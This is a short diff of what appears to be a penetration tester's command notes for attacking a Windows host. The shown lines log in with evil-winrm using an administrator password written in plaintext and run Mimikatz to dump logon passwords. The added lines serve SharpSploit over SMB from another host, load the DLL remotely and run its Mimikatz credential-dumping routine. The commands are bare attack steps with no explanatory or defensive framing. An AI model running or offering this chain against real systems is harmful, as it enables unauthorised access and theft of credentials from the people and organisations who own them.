@@ -32,3 +32,9 @@ evil-winrm.rb -u administrator -p rocknroll_123321 -i 10.4.23.208 -s /root/Deskt
 Invoke-Mimikatz.ps1
 menu
 Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'
+
+smbserver.py -comment 'DLL' -smb2support test /root/Desktop/tools/SharpSploit 
+Dll-Loader -smb -path \\10.10.0.2\test\SharpSploit.dll
+[SharpSploit.Credentials.Mimikatz]::All()
+
+
